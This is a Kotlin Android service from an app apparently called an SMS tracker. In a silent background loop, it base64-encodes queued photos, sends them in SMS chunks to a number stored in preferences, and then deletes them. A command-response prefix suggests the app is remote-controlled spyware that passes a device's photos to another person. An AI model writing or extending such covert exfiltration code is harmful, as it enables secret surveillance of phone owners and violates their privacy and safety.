package com.safi.smstracker

import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import java.io.File

class PhotoUploadService : Service() {

    companion object {
        private const val TAG = "SAFI_UPLOAD"
        private val photoQueue = mutableListOf<File>()
        private var isMonitoring = false
        private var handler: Handler? = null
        private val CHECK_INTERVAL = 30000L

        fun addPhotoToQueue(context: Context, photo: File) {
            synchronized(photoQueue) {
                photoQueue.add(photo)
                Log.d(TAG, "📸 Photo en file d'attente: ${photo.name} — Total: ${photoQueue.size}")
            }
            startMonitoring(context)
        }

        private fun startMonitoring(context: Context) {
            if (!isMonitoring) {
                isMonitoring = true
                context.startService(Intent(context, PhotoUploadService::class.java))
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        handler = Handler(Looper.getMainLooper())
        startNetworkMonitor()
    }

    private fun startNetworkMonitor() {
        handler?.post(object : Runnable {
            override fun run() {
                checkNetworkAndSend()
                handler?.postDelayed(this, CHECK_INTERVAL)
            }
        })
    }

    private fun checkNetworkAndSend() {
        if (!isNetworkAvailable()) return

        synchronized(photoQueue) {
            val toSend = photoQueue.filter { it.exists() }.toList()
            if (toSend.isEmpty()) return

            Log.d(TAG, "🌐 Internet disponible — Envoi de ${toSend.size} photo(s)")
            
            toSend.forEach { photo ->
                sendPhotoViaSMS(photo)
                photoQueue.remove(photo)
            }
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } else {
            @Suppress("DEPRECATION")
            val info = cm.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return info.isConnected
        }
    }

    private fun sendPhotoViaSMS(photo: File) {
        try {
            val prefs = getSharedPreferences("SAFI_CONFIG", Context.MODE_PRIVATE)
            val otherNum = prefs.getString("OTHER_NUM", "") ?: return
            
            val photoBytes = photo.readBytes()
            val base64 = android.util.Base64.encodeToString(photoBytes, android.util.Base64.NO_WRAP)
            
            val maxChunk = 150
            val totalChunks = (base64.length + maxChunk - 1) / maxChunk
            
            Log.d(TAG, "📤 Envoi photo ${photo.name} — $totalChunks fragments")
            
            for (i in 0 until totalChunks) {
                val end = minOf((i + 1) * maxChunk, base64.length)
                val chunk = base64.substring(i * maxChunk, end)
                val msg = "${Commands.RESPONSE_PHOTO}${photo.name}|$i|$totalChunks|$chunk"
                
                sendSmsChunk(otherNum, msg)
                Thread.sleep(500)
            }
            
            Log.d(TAG, "✅ Photo ${photo.name} envoyée complètement")
            photo.delete()
            
        } catch (e: Exception) {
            Log.e(TAG, "Erreur envoi photo", e)
        }
    }

    private fun sendSmsChunk(to: String, message: String) {
        try {
            val smsManager = android.telephony.SmsManager.getDefault()
            try {
                smsManager.sendDataMessage(to, null, Commands.PORT.toShort(), message.toByteArray(Charsets.UTF_8), null, null)
            } catch (e: Exception) {
                smsManager.sendTextMessage(to, null, message, null, null)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Échec envoi SMS", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        super.onDestroy()
        handler?.removeCallbacksAndMessages(null)
        isMonitoring = false
    }
}
